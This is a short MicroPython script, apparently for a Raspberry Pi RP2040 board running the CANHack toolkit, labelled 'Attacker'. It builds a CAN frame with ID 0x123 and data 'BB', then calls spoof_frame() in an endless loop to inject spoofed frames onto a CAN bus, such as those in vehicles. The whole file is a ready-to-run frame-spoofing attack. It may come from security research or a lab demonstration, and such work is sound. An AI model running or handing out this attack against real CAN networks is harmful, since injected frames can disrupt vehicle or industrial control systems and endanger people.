# Attacker
# Initializes the CANHack toolkit ( bit_rate is one of 500, 250, or 125)
from rp2 import *
ch = CANHack()

# set up a CAN frame
ch.set_frame(can_id=0x123, data=b'BB')
ch.print_frame()

# Spoof Frame attack
while True:
    ch.spoof_frame()
